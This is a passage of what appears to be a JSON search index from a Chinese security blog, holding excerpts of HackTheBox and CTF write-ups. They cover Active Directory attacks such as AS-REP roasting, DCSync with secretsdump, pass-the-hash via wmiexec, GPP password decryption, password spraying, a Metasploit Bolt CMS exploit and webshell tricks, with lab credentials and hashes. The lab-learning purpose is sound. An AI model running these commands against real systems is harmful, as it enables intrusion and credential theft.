SF:tml\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20init SF:ial-scale=1\\.0\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\u0026lt;title\u0026gt;Bolt\\x20\\|\\x20A\\x20hero\\x20is\\x20unleashed\u0026lt;/title\u0026gt;\\n SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;link\\x20href=\\\u0026#34;https://fonts\\.googleap SF:is\\.com/css\\?family=Bitter\\|Roboto:400,400i,700\\\u0026#34;\\x20rel=\\\u0026#34;stylesheet\\\u0026#34; SF:\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href= SF:\\\u0026#34;/theme/base-2018/css/bulma\\.css\\?8ca0842ebb\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/theme/base-2018/css/t SF:heme\\.css\\?6cb66bfe9f\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\t\u0026lt;meta\\x20name=\\\u0026#34;generator\\\u0026#34; SF:\\x20content=\\\u0026#34;Bolt\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\u0026gt;\\ SF:n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;a\\x20href=\\\u0026#34;#main-content\\\u0026#34;\\x20class= SF:\\\u0026#34;vis\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Oct 1 10:14:51 2024 -- 1 IP address (1 host up) scanned in 75.38 seconds 访问后发现，在80端口存在apache默认页面，在8000端口运行着Bolt CMS\nBolt CMS 在页面找到用户名和密码bolt : boltadmin123\n网上搜索发现该CMS默认登录路由是/bolt，利用刚才获得的用户名密码登录\n登录成功后发现该版本为3.7.1\n漏洞利用 通过searchsploit查找后发现早期的RCE漏洞\n为了方便后续操作，这里使用msf进行攻击\n通过msfconsole启动msf后，使用search命令进行查询\n使用use 0命令使用\n输入show options查看必要参数\n将必要参数设置好\nrun启动\n发现直接就是root权限\n最终在/home目录下找到flag\n","date": "2024-10-01 10:07:48",
    "updated": "2025-11-11 10:32:24"
  }, 
  {
    "objectID": "ded906df872b22859c04a11671e7d413dfbb3498",
    "permalink": "/post/htb-multimaster/",
    "title": "HTB Multimaster","content": " 靶机ip：10.10.10.179\n知识点 MSSQL注入 MSSQL注入枚举域用户 CVE-2019-1414 滥用GenericWrite权限横向移动 滥用Server Operators组权限实现权限提升 SeBackupPrivilege和SeRestorePrivilege权限的滥用 信息收集 nmap扫描 nmap -sS -sV -sC -p- 10.10.10.179\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 15:15 CST Nmap scan report for 10.10.10.179 Host is up (0.42s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: 403 - Forbidden: Access is denied. | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-23 07:23:11Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active …","date": "2024-07-23 14:31:07",
    "updated": "2025-11-11 10:17:23"
  }, 
  {
    "objectID": "da4ba1e81eff720d1e9eacad99b16ffbaa6ae356",
    "permalink": "/post/htb-cascade/",
    "title": "HTB Cascade","content": " 靶机ip：10.10.10.182\n知识点 TightVNC密码破解 AD Recycle Bin滥用权限提升 信息收集 nmap扫描 nmap -sS -sV -sC -p- 10.10.10.182\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 11:27 CST Nmap scan report for 10.10.10.182 Host is up (0.45s latency). PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-22 03:28:03Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp filtered kpasswd5 593/tcp filtered http-rpc-epmap 636/tcp open tcpwrapped 1337/tcp filtered waste 1433/tcp filtered ms-sql-s 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp filtered msdfsr 5985/tcp open http Microsoft …","date": "2024-07-22 11:04:22",
    "updated": "2025-11-11 10:11:28"
  }, 
  {
    "objectID": "f4d7babc0bbfa3d3c288c752362db3df622a484c",
    "permalink": "/post/htb-mantis/",
    "title": "HTB Mantis","content": " 靶机ip：10.10.10.52\n知识点 MS14-068权限提升 信息收集 nmap扫描 nmap -sS -sV -sC -p- 10.10.10.52\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 21:03 CST Nmap scan report for 10.10.10.52 Host is up (0.41s latency). PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15CD4) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-18 13:03:51Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 1337/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 1433/tcp …","date": "2024-07-18 15:11:31",
    "updated": "2025-11-11 10:06:26"
  }, 
  {
    "objectID": "952b95b76585128388d57e8c0c5f3df7be7ca9f7",
    "permalink": "/post/htb-sizzle/",
    "title": "HTB Sizzle","content": " 靶机ip：10.10.10.103\n知识点 SCF文件攻击 Net-NTLMv2 hash破解 利用证书登录evil-winrm BypassCLM Kerberoasting Bypass-AppLocker DCSync攻击 PTH传递攻击 信息收集 nmap扫描 nmap -sS -sV -sC 10.10.10.103\n发现有ftp服务、DNS服务、Web服务、ldap服务、 smb服务，域名为HTB.LOCAL\nftp 扫描的结果显示ftp可以登录，使用ftp尝试登录\nftp 10.10.10.103\n没什么有用的信息\nWeb 发现开放80和443两个端口，查看一下\n发现两个网站可能是同一个\n拿dirsearch扫一下网站目录\ndirsearch -u http://10.10.10.103/\n很明显有个与众不同的结果访问一下\n发现存在一个登录框，但是没有用户名和密码，先放着\nldap ldapsearch -x -H ldap://10.10.10.103:389 -s base -b \u0026amp;quot;\u0026amp;quot; namingcontexts\n没什么有用的信息\nSMB smbclient -N -L \\\\10.10.10.103\n发现如上信息，测试一下\nsmbclient -U \u0026amp;quot;\u0026amp;quot; //10.10.10.103/CertEnroll\n发现连接到CertEnroll，但是没有可执行命令的权限，但是这个很奇怪，感觉跟之前测试的web的登陆有关系，但是没有读取权限，继续测试\nsmbclient -U \u0026amp;quot;\u0026amp;quot; //10.10.10.103/\u0026amp;quot;Department Shares\u0026amp;quot;\n发现在Department Shares里，可以继续操作，先接着测试\nsmbclient -U \u0026amp;quot;\u0026amp;quot; //10.10.10.103/NETLOGON\n还是无法执行命令，继续测试\n发现除了Department Shares其他都不可以正常执行命令，所以重点放在Department Shares上\n我们注意到dir结果中有Users目录，查看一下\n拿到用户名列表，但是目录都是空的\namanda amanda_adm bill bobcd Users chris henry joe jose lkys37en …","date": "2024-07-15 17:19:03",
    "updated": "2025-11-11 09:58:36"
  }, 
  {
    "objectID": "fed5e65001511cf69da1ab98988fc92674778ab8",
    "permalink": "/post/htb-resolute/",
    "title": "HTB Resolute","content": " 靶机ip：10.10.10.169\n知识点 密码喷洒 利用DnsAdmins提权 信息收集 nmap扫描 拿nmap扫一下\nnmap -sS -sV -sC 10.10.10.169\n分析发现有DNS服务、kerberos服务、ldap服务、smb服务，域名为megabank.local\nSMB 简单测试一下\nsmbclient -L //10.10.10.169\n匿名登陆成功但是没什么有用的信息\nldap ldapsearch -H ldap://10.10.10.169:389 -x -s base -b \u0026amp;quot;\u0026amp;quot; namingcontexts\n也没啥有用信息\nRPC 利用RPC远程过程调用枚举用户\nrpcclient -U \u0026amp;quot;\u0026amp;quot; -N 10.10.10.169\n枚举用户\nenumdomusers\n显示用户详细列表信息\nquerydispinfo\n找到用户名密码：marko : Welcome123!\n尝试rpcclient和smbclient登录\nsmbclient -U marko -L //10.10.10.169\nrpcclient -U marko -N 10.10.10.169\n都失败了。\n密码喷洒 既然marko用户登录不上，不妨拿这个密码去试试其他的用户，利用crackmapexec工具尝试密码喷洒攻击\n先将之前通过rpcclient的enumdomusers命令拿到的用户名列表保存为users\n写个python脚本将其提取到users.txt中\n# 打开uusers.txt文件进行读取 with open(\u0026amp;#39;users\u0026amp;#39;, \u0026amp;#39;r\u0026amp;#39;, encoding=\u0026amp;#39;utf-8\u0026amp;#39;) as infile: lines = infile.readlines() # 打开user.txt文件进行写入 with open(\u0026amp;#39;users.txt\u0026amp;#39;, \u0026amp;#39;w\u0026amp;#39;, encoding=\u0026amp;#39;utf-8\u0026amp;#39;) as outfile: for line in lines: # 使用正则表达式匹配user后面的用户名 import re match = re.search(r\u0026amp;#39;user:\\[(.*?)\\]\u0026amp;#39;, line) if match: …","date": "2024-07-12 14:30:34",
    "updated": "2025-11-11 09:52:07"
  }, 
  {
    "objectID": "f834a3c5a001975ec024bb6ba1581b4e1d5b448b",
    "permalink": "/post/htb-blackfield/",
    "title": "HTB Blackfield","content": " 靶机ip：10.10.10.192\n知识点 AS-REP Roasting ForceChangePassword权限滥用实现横向移动 利用Lsass内存捕获文件提取用户hash 利用SeBackupPrivilege权限进行NTDS.dit卷影拷贝实现权限提升 使用wmiexec进行PTH 信息收集 nmap扫描 nmap -sS -sV -sC 10.10.10.192\n有DNS服务，kerberos服务，LDAP服务，SMB服务，域名BLACKFIELD.local\nSMB 直接尝试一手匿名登录\nsmbclient -L \\\\10.10.10.192\n发现得到一些共享资源，尝试获取profiles$资源\nsmbclient //10.10.10.192/profiles$\n发现一些使用者的名称，将每条带名字的数据保存到users.txt中，写个脚本将其保存到user.txt中\nimport re with open(\u0026amp;#39;users.txt\u0026amp;#39;, \u0026amp;#39;r\u0026amp;#39;) as file: data = file.read() # 使用正则表达式提取姓名部分 pattern = re.compile(r\u0026amp;#39;^\\s*(\\S+)\u0026amp;#39;, re.MULTILINE) names = pattern.findall(data) # 将提取的姓名保存到新文件 with open(\u0026amp;#39;user.txt\u0026amp;#39;, \u0026amp;#39;w\u0026amp;#39;) as output_file: for name in names: output_file.write(name + \u0026amp;#39;\\n\u0026amp;#39;) print(\u0026amp;#34;提取的数据已保存到 \u0026amp;#39;user.txt\u0026amp;#39; 文件中。\u0026amp;#34;) 这样就获得了一个基本的用户列表\nLDAP 利用ldapsearch搜索\nldapsearch -H ldap://10.10.10.192:389 -x -s base -b \u0026amp;quot;\u0026amp;quot; namingcontexts\n得到两个域名\nDomainDnsZones.blackfield.local\nForestDnsZones.blackfield.local\nAS-REP Roasting 拿到了用户名，这里又暴露了kerberos端口88。尝试一下 …","date": "2024-07-09 19:30:53",
    "updated": "2025-11-11 09:42:11"
  }, 
  {
    "objectID": "0d0e2cc5e7223903efee0fd2abf046ad27be6838",
    "permalink": "/post/htb-active/",
    "title": "HTB Active","content": " 靶机ip：10.10.10.100\n知识点 组策略安全问题 Kerberoasting攻击 组策略GPP密码解密 信息收集 nmap扫描 nmap -sS -sV -sC 10.10.10.100\n发现有kerberos服务，smb服务，ldap服务，域名为 active.htb\nSMB smbclient -L \\\\10.10.10.100\n发现匿名登陆成功，并得到一些可以访问的共享资源，进一步探测\nsmbmap -H 10.10.10.100\n可以看到匿名用户对 Replication 文件夹具有 READ ONLY 权限，尝试访问\nsmbclient //10.10.10.100/Replication\n组策略GPP密码解密 当创建新的组策略首选项（GPP）时，在 C:\\Windows\\SYSVOL 中会创建一个与相关配置数据相关联的XML文件，其中包括与 GPP 关联的任何密码。为了安全起见，Microsoft AES 在将密码存储为 cpassword 但随后微软在 MSDN 上发布了密钥。 由于经过身份验证的用户（任何域用户或受信任域中的用户）都具有对SYSVOL的读取权限，所以域中的任何人都可以搜索包含“cpassword”的XML文件的SYSVOL共享，该文件是包含AES加密密码的值。\n所有域组策略都存储在：\\ SYSVOL \\ Policies \\\n使用smbclient尝试访问该目录的文件，最后在\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\目录下发现Groups.xml文件\n可以拿到一对用户名和GPP密码\nactive.htb\\SVC_TGS : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\n由于密钥是已知的，我们可以使用Kali上的工具gpp-decrypt来解密\ngpp-decrypt \u0026amp;quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026amp;quot; …","date": "2024-07-05 09:38:14",
    "updated": "2025-11-11 09:39:30"
  }, 
  {
    "objectID": "514a7b7423e0ea339730906693c4de116465826b",
    "permalink": "/post/htb-sauna/",
    "title": "HTB Sauna","content": " 靶机ip：10.10.10.175\n知识点 AS-REP Roasting DCSync提权 PTH传递攻击 信息收集 nmap扫描 nmap扫一下\nnmap -sS -sV -sC 10.10.10.175\n发现有web服务，DNS服务，Kerberos服务，smb共享服务，RPC服务，LDAP服务，有AD域\n得到一个域名EGOTISTICAL-BANK.LOCAL\n先简单测试一下\nSMB 尝试匿名登录SMB服务\nsmbclient -N -L \\\\10.10.10.175\n匿名登陆成功，但是并无重要信息\nLDAP 尝试使用ldapsearch工具尝试获取域中的用户，根据之前得到的域名EGOTISTICAL-BANK.LOCAL构造如下命令\nldapsearch -x -H ldap://10.10.10.175 -b \u0026quot;dc=Egotistical-bank,dc=local\u0026quot; | grep \u0026quot;dn:\u0026quot;\n获取到一个可能叫做Hugo Smith的用户\nRPC 尝试RPC空账号登录\nRPC拒绝连接\nWEB 在页面中，找到如下姓名\nFergus Smith\nShaun Coins\nHugo Bear\nSteven Kerb\nBowie Taylor\nSophie Driver\nkerbrute用户名枚举 尝试通过kerbrute列出使用者，字典使用的是seclists\n./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 可以看到有hsmith和fsmith用户\nAS-REP Roasting 将两个用户名保存到user.txt，尝试一下AS-REP Roasting攻击\npython3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user.txt -dc-ip 10.10.10.175 拿到fsmith用户的hash\n$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:58bdf4fa347723cb982bdcc37337eb8d$44fdc778d8e0f2346c7d67f5ea08324f2b3db42ec4726705e8c2b13a7bb234f5fcec23542121d7a837f4e9d4cc698f8572eb2e9ba53497d2cffd9d12a25d8db80a52e1d5547344805a85fd9d27ba14fae2dc53467ab6f41887439fde483e0506e3529190a22172243fb9bbece3c21e0f95034100c96a824c57772ee81729d53c699dd9c30c9bf130b33429af8f08aa7c54da5f6d651966bd2235a601c489c9ba37a3ae4d9a9e8166ab978bfa71ee4e4b1d22c6d7a24a6257f2a9302dfc5afc1ccb326a9904bed9f492f3dcae0e68080d7a4a8d0aa2e13a7cf2a4a14982d55cea5d844180e1b1adb490c2f792ea3fb9f4196f23f0f72fe50982c991b0064be0b7 使用john破解\n将上述票据保存为hash，使用john爆破hash值\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt\njohn hash -show\n拿到fsmith的凭证fsmith:Thestrokes23\n尝试远程登陆\nevil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'\n登录成功\n最后在桌面上拿到user.txt\n注册表获取用户密码 在Users目录下发现新用户svc_loanmgr\n通过查询Winlogon注册表来手动收集信息\nreg.exe query \u0026quot;HKLM\\software\\microsoft\\windows nt\\currentversion\\winlogon\u0026quot;\n拿到用户名密码svc_loanmanager : Moneymakestheworldgoround!\n但是通过登录发现svc_loanmanager 登不上，登录svc_loanmgr登陆成功\nAD域渗透权限提升 BloodHound信息搜集 登录svc_loanmgr用户\nevil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'\n接下来使用bloodhound进行信息搜集\nupload /root/htb/Machines/Sauna/SharpHound.exe ./SharpHound.exe download 20240706064043_BloodHound.zip 分析发现可以利用DCSync攻击直接域控\nDCSync提权 使用secretsdump.py工具执行 DCSync 以转储管理员用户的 NTLM 哈希\npython3 /usr/share/doc/python3-impacket/examples/secretsdump.py svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175\n可以看到已经拿到所有用户的hash，包括admin用户的\nPTH传递攻击获取Root 拿到了管理员的hash，就可以通过wmiexec哈希传递拿到管理员用户的权限\npython3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.175\n成功拿到管理员用户的权限\n最后在desktop获取root.txt\n","date": "2024-07-02 13:42:59",
    "updated": "2025-11-11 09:35:33"
  }, 
  {
    "objectID": "735074fb33da08d4f5a15ef6c4461fe25f5990b5",
    "permalink": "/post/htb-forest/",
    "title": "HTB Forest","content": " 靶机ip：10.10.10.161\n知识点 AD域渗透提取 AS-REP Roasting攻击 Hash爆破 PTH传递攻击 滥用DCSync 信息收集 nmap扫描 拿namp扫一下\nnmap -sS -sV -sC 10.10.10.161\n发现存在系统Windows Server 2016，有DNS服务，Kerberos服务，smb共享服务，RPC服务，无web页面，只有AD域\n先将域名加到配置文件中\necho \u0026amp;#34;10.10.10.161 htb.local\u0026amp;#34; \u0026amp;gt;\u0026amp;gt; /etc/hosts echo \u0026amp;#34;10.10.10.161 forest.htb.local\u0026amp;#34; \u0026amp;gt;\u0026amp;gt; /etc/hosts Domain: htb.local\nworkgroup: HTB\nSMB 尝试匿名登录SMB服务\nsmbclient -L \\\\10.10.10.161\n也是没有什么重要信息\nLDAP 尝试使用ldapsearch工具尝试获取域中的用户列表，根据之前得到的域名htb.local构造如下命令：\nldapsearch -H ldap://10.10.10.161:389 -x -b \u0026amp;quot;CN=users,DC=htb,DC=local\u0026amp;quot;\n也没什么重要的信息\nRPC 利用RPC远程过程调用枚举用户\n┌──(root㉿DESKTOP-K196DPF)-[~/MyFile] └─# rpcclient -U \u0026amp;#34;\u0026amp;#34; -N 10.10.10.161 rpcclient $\u0026amp;gt; enumdomusers 先将用户名整理出来\nAdministrator Guest krbtgt DefaultAccount $331000-VK4ADACQNUCA SM_2c8eef0a09b545acb SM_ca8c2ed5bdab4dc9b SM_75a538d3025e4db9a SM_681f53d4942840e18 SM_1b41c9286325456bb SM_9b69f1b9d2cc45549 SM_c75ee099d0a64c91b SM_1ffab36a2f5f479cb HealthMailboxc3d7722 HealthMailboxfc9daad …","date": "2024-06-27 20:12:35",
    "updated": "2025-11-11 09:30:53"
  }, 
  {
    "objectID": "ac36a03f59e213bb5b6784db44d357125dc2cc95",
    "permalink": "/post/ciscn2024/",
    "title": "CISCN2024","content": " Misc 火锅链观光打卡 微信公众号获得提示\n提示装插件\n然后开始游戏，攒够7种不同的食物，兑换即可\nflag{y0u_ar3_hotpot_K1ng}\nPower Trajectory Diagram 拷打gpt写读取npz文件的脚本\nimport numpy as np # 读取 .npz 文件 file_path = \u0026amp;#39;attachment.npz\u0026amp;#39; data = np.load(file_path) # 打印文件中的数组名称 print(\u0026amp;#34;Arrays in the .npz file:\u0026amp;#34;) print(data.files) # 访问和打印每个数组 for array_name in data.files: array = data[array_name] print(f\u0026amp;#34;\\nArray name: {array_name}\u0026amp;#34;) print(array) 通过input、index、trace的内容可以分析出，它⼤概有13组数据每组数据对应⼀幅图，有点类似键盘敲击的\n分析读取的三组数据，发现对应是13组图，每组数据对应一个最低点，再拷打gpt写个读取的最小值中的最大值\nexp import numpy as np # 加载 .npz 文件中的数据 data = np.load(\u0026amp;#34;attachment.npz\u0026amp;#34;) # 从 .npz 文件中提取 \u0026amp;#39;index\u0026amp;#39;, \u0026amp;#39;trace\u0026amp;#39;, 和 \u0026amp;#39;input\u0026amp;#39; 数组 index = data[\u0026amp;#39;index\u0026amp;#39;] trace = data[\u0026amp;#39;trace\u0026amp;#39;] input_data = data[\u0026amp;#39;input\u0026amp;#39;] # 初始化一个空字符串，用于存储结果 result = \u0026amp;#34;\u0026amp;#34; # 遍历范围 12，处理 input_data 的每一个 40 行块 for i in range(12): # 获取当前块的 40 行数据 table = input_data[40 * i: 40 * (i + 1)] # 对于每一行（共 40 行），找到 trace 中每一行的最小值的索引 min_indices = [np.argmin(trace[i * 40 + j]) …","date": "2024-06-06 18:44:54",
    "updated": "2025-11-10 16:26:54"
  }, 
  {
    "objectID": "b74cc506c386ed923cfdf1b9cbd0b12a914b5e5e",
    "permalink": "/post/%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B2024/",
    "title": "高校网络安全管理运维赛2024","content": " Misc 签到 GIF 拆分 字符拼接\nsynt{guvf-vf-gur-fvtava-dhvm} ROT13: flag{this-is-the-signin-quiz} 钓鱼邮件识别 打开eml base64解码 Flag1 Flag2 Flag3 第三段解析DNS的记录 easyshell 追踪流到倒数几个服务器流量解密发现如下 pk头，是zip，保存成zip文件 还发现了secret2.txt的内容 用上述txt，明文攻击zip 用明文攻击获取到的key直接解secret1.txt SecretDB 用DB Browser for SQLite查看数据库，但是说flag不在这里 放到010中，发现这句话下面还藏着点东西，在01 0F之间有东西 然后写脚本进行提取\nwith open(\u0026amp;#39;secret.db\u0026amp;#39;, \u0026amp;#39;rb\u0026amp;#39;) as f: c = f.read() flag = {} parts = c.split(b\u0026amp;#39;\\x01\\x0f\u0026amp;#39;) for i in parts[1:-2]: # 修正切片范围 flag[i[0]] = chr(i[1]) # 直接按照排序后的键值对打印结果 for k in sorted(flag.keys()): print(flag[k], end=\u0026amp;#39;\u0026amp;#39;) # 或者使用下面的一行代码来替代上面的 for 循环 # print(\u0026amp;#39;\u0026amp;#39;.join([flag[k] for k in sorted(flag.keys())])) Gateway 在附件中找到了密码，但还是编码的 在题目附件里发现这个，联想到电信光猫的超密解密 参考内容 破解光猫超级管理员密码，也就是获取telecomadmin的密码 把里面的数字提取，然后三位数的内容把数字减掉4，从ASCII转字符即可，其他部分直接从ASCII转成字符即可，拼在一起\nnumbers = [106, 112, 101, 107, 127, 101, 104, 49, 57, 56, 53, 56, 54, 56, 49, 51, 51, 105, 56, 103, 106, 49, 56, 50, 56, 103, 102, 56, 52, 101, 104, 102, 105, 53, 101, 53, 102, …","date": "2024-05-14 15:34:35",
    "updated": "2025-11-10 16:55:40"
  }, 
  {
    "objectID": "f024d70d282d7f742271034f8c7ca7c5b5ee5c4d",
    "permalink": "/post/nctf-2023/",
    "title": "NCTF 2023","content": " Web Webshell Generator 题目是一个Webshell生成的功能，可以填写Webshell的语言（只有PHP）、访问方法、Webshell密码（通过前端限制格式为[A-Za-z0-9]）\n生成完后会将其下载到本地\n通过抓包发现可以任意下载文件，经测试发现无权限读取flag\n尝试读取页面源码：/download.php?file=index.php\u0026amp;amp;filename=webshell.php\n\u0026amp;lt;?php function security_validate() { foreach ($_POST as $key =\u0026amp;gt; $value) { if (preg_match(\u0026amp;#39;/\\r|\\n/\u0026amp;#39;, $value)) { die(\u0026amp;#34;$key 不能包含换行符！\u0026amp;#34;); } if (strlen($value) \u0026amp;gt; 114) { die(\u0026amp;#34;$key 不能超过114个字符！\u0026amp;#34;); } } } security_validate(); if (@$_POST[\u0026amp;#39;method\u0026amp;#39;] \u0026amp;amp;\u0026amp;amp; @$_POST[\u0026amp;#39;key\u0026amp;#39;] \u0026amp;amp;\u0026amp;amp; @$_POST[\u0026amp;#39;filename\u0026amp;#39;]) { if ($_POST[\u0026amp;#39;language\u0026amp;#39;] !== \u0026amp;#39;PHP\u0026amp;#39;) { die(\u0026amp;#34;PHP是最好的语言\u0026amp;#34;); } $method = $_POST[\u0026amp;#39;method\u0026amp;#39;]; $key = $_POST[\u0026amp;#39;key\u0026amp;#39;]; putenv(\u0026amp;#34;METHOD=$method\u0026amp;#34;) or die(\u0026amp;#34;你的method太复杂了！\u0026amp;#34;); putenv(\u0026amp;#34;KEY=$key\u0026amp;#34;) or die(\u0026amp;#34;你的key太复杂了！\u0026amp;#34;); $status_code = -1; $filename = shell_exec(\u0026amp;#34;sh generate.sh\u0026amp;#34;); if (!$filename) { die(\u0026amp;#34;生成失败了！\u0026amp;#34;); } $filename = trim($filename); header(\u0026amp;#34;Location: …","date": "2023-12-24 19:24:52",
    "updated": "2025-11-10 16:52:50"
  }, 
  {
    "objectID": "45151f61b97f1e0c4106612ae8b760bd5e209d83",
    "permalink": "/post/dasctf-x-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/",
    "title": "DASCTF X 0psu3十一月挑战赛 2023","content": " Web realrce 附件中有源码：\nfunction waf(input_code) { bypasspin = /%[0-9a-fA-F]{2}/i; const bypasscode = bypasspin.test(input_code); if (bypasscode) { try { return waf(decodeURIComponent(input_code)); } catch (error) { console.error(\u0026amp;#34;Error decoding input: \u0026amp;#34;, error); return false; } } const blacklist = [/__proto__/i, /constructor/i, /prototype/i]; for (const blackword of blacklist) { if (blackword.test(input_code)) { return true; } } return false; } 利用报错来绕过waf进行原型链污染\nfunction LockCylinder(input, blackchr = [\u0026amp;#34;\u0026amp;amp;\u0026amp;amp;\u0026amp;#34;, \u0026amp;#34;||\u0026amp;#34;, \u0026amp;#34;\u0026amp;amp;\u0026amp;#34;, \u0026amp;#34;|\u0026amp;#34;, \u0026amp;#34;\u0026amp;gt;\u0026amp;#34;, \u0026amp;#34;*\u0026amp;#34;, \u0026amp;#34;+\u0026amp;#34;, \u0026amp;#34;$\u0026amp;#34;, \u0026amp;#34;;\u0026amp;#34;]) { const resultArray = []; let currentPart = \u0026amp;#34;\u0026amp;#34;; for (let i = 0; i \u0026amp;lt; input.length; i++) { const currentChar = input[i]; if (blackchr.includes(currentChar)) { if (currentPart.length \u0026amp;gt; 0) { resultArray.push(currentPart); currentPart = \u0026amp;#34;\u0026amp;#34;; } } else { currentPart += currentChar; } } if (currentPart.length \u0026amp;gt; 0) { …","date": "2023-11-28 16:50:14",
    "updated": "2025-11-10 16:50:14"
  }, 
  {
    "objectID": "e2061644db7e34c4ddcf5b34c9a0599eff527684",
    "permalink": "/post/nepctf-2023/",
    "title": "NepCTF 2023","content": " MISC 与AI共舞的哈夫曼 将给的代码扔给gpt，发现缺少一段代码，直接让它帮写出来\ndef decompress(input_file, output_file): with open(input_file, \u0026amp;#39;rb\u0026amp;#39;) as f: # Read frequency information num_symbols = ord(f.read(1)) frequencies = {} for _ in range(num_symbols): byte, freq_bytes = f.read(1)[0], f.read(4) freq = (freq_bytes[0] \u0026amp;lt;\u0026amp;lt; 24) | (freq_bytes[1] \u0026amp;lt;\u0026amp;lt; 16) | (freq_bytes[2] \u0026amp;lt;\u0026amp;lt; 8) | freq_bytes[3] frequencies[byte] = freq # Rebuild Huffman tree root = build_huffman_tree(frequencies) # Read compressed data compressed_data = f.read() bit_string = \u0026amp;#39;\u0026amp;#39;.join(format(byte, \u0026amp;#39;08b\u0026amp;#39;) for byte in compressed_data) current_node = root decompressed_data = [] for bit in bit_string: if bit == \u0026amp;#39;0\u0026amp;#39;: current_node = current_node.left else: current_node = current_node.right if current_node.char is not None: decompressed_data.append(current_node.char) current_node = root with open(output_file, \u0026amp;#39;wb\u0026amp;#39;) as f: f.write(bytes(decompressed_data)) codes 进去是个C语言的代码执行器\n提示说环境变量里面有flag，尝试打印环境变量\nlinux下获取系统环 …","date": "2023-08-17 09:19:39",
    "updated": "2025-11-10 17:17:45"
  }]